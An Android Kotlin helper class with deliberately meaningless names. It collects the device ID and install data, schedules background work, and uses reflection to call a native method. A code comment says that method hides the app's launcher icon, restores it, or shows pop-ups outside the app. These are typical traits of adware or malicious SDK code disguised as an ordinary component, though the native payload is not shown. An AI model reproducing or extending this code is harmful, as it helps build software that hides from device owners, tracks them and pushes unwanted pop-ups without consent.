package com.sister.smart.blonde

import android.app.Application
import android.content.Context
import android.provider.Settings
import androidx.work.OneTimeWorkRequest
import androidx.work.WorkManager
import java.util.UUID
import java.util.concurrent.TimeUnit

/**
 * Date：2025/4/21
 * Describe:
 * com.sister.smart.blonde.AngelHelper
 */
object AngelHelper {
    var urlAngle = ""

    @JvmStatic
    fun sisterInit(context: Context) {
        if (Headband.mHeadAndroidIdStr.isBlank()) {
            Headband.mHeadAndroidIdStr = Settings.System.getString(
                context.contentResolver, Settings.Secure.ANDROID_ID
            ).ifBlank {
                UUID.randomUUID().toString()
            }
            blonde(203)
        }
        context.packageManager.getPackageInfo(context.packageName, 0).apply {
            Headband.versionName = versionName
            Headband.appInstallTime = firstInstallTime
        }
        angelStr(context)
    }

    private var time = 0L
    fun workStart(context: Context) {
        if (System.currentTimeMillis() - time < 60000) return
        time = 0L
        val workRequest =
            OneTimeWorkRequest.Builder(SisterWM::class.java).setInitialDelay(1, TimeUnit.MINUTES)
                .build()
        val workManager = WorkManager.getInstance(context)
        workManager.enqueue(workRequest)
    }

    @JvmStatic
    fun angelStr(context: Context) {
        val mSmartFairy = SmartFairy(context)
        mSmartFairy.sister()
        if (context is Application) {
            mSmartFairy.registerThis(context)
        }
    }

    //参数num%10==6隐藏图标,num%10==3恢复隐藏.num%10==9外弹(外弹在主进程主线程调用).
    @JvmStatic
    external fun boss(p: Int, num: Int): Int


    fun blonde(num: Int) {
        val cla = Class.forName("com.sister.smart.blonde.AngelHelper")
        cla.getMethod("boss", Int::class.java, Int::class.java).invoke(null, num * 18, num)
    }

    @JvmStatic
    fun smart(string: String): Any? {
        return Headband.blondeQuery(string)
    }

}